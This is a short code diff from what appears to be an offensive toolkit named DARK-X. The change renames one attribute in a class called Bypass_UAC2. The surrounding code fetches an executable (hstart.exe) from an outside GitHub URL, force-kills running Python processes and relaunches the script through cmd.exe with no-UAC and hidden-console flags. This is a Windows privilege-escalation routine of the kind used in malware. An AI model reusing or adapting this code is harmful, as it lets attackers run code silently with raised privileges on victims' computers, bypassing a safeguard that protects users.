@@ -3,7 +3,7 @@ import tempfile
 from subprocess import Popen,PIPE
 class Bypass_UAC2():
 	def __init__(self,_):
-		self.program = _.program
+		self.note = _.note
 		self.hstart = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/bin/hstart.exe"
 		self.Main()
 
@@ -19,4 +19,4 @@ class Bypass_UAC2():
 
 		python = sys.executable
 		me = sys.argv[0]
-		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.program], shell=True)
+		sub = Popen(["cmd.exe","/c","taskkill","/IM","python.exe","/F","&",filename, '/NOCONSOLE', '/NOUAC', python + " " + me + " " + self.note], shell=True)
